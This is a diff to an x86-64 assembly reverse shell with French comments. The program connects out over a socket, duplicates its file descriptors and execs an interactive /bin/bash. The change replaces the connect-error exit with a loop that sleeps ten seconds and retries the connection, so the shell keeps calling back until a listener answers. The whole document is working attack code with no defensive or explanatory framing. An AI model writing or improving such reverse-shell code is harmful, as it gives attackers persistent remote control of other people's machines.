@@ -31,10 +31,10 @@ segment .data
 		dq arg0
 		dq arg1
 		dq 0
-	
-	ps1 db "PS1=\[\e[1;32m\]\u@\h:\w\$ \[\e[0m\]", 0
 
-    envp dq ps1, 0
+	timespec:
+        dq 10      ; tv_sec = 10s
+        dq 0       ; tv_nsec = 0
 
 segment .text
 	global _start:
@@ -108,7 +108,7 @@ _execution:
     mov rax, 59                  ; syscall execve
     lea rdi, [rel binsh]     ; chemin vers /bin/bash
     lea rsi, [rel argv]          ; argv = {"bash", "-i", NULL}
-    lea rdx, [rel envp]          ; envp = {PS1=..., NULL}
+	xor rdx, rdx
     syscall
 
     test rax, rax
@@ -121,9 +121,13 @@ _socket_error:
 	jmp _error
 
 _connect_error:
-    	mov rsi, error_connect
-	mov rdx, 28
-    	jmp _error
+    ; sleep(10)
+    mov rax, 35             ; syscall nanosleep
+    lea rdi, [rel timespec] ; struct timespec
+    xor rsi, rsi            ; no old_timespec
+    syscall
+
+    jmp _connection         ; retry connection
 
 _dup2_0_error:
     	mov rsi, error_dup2_0
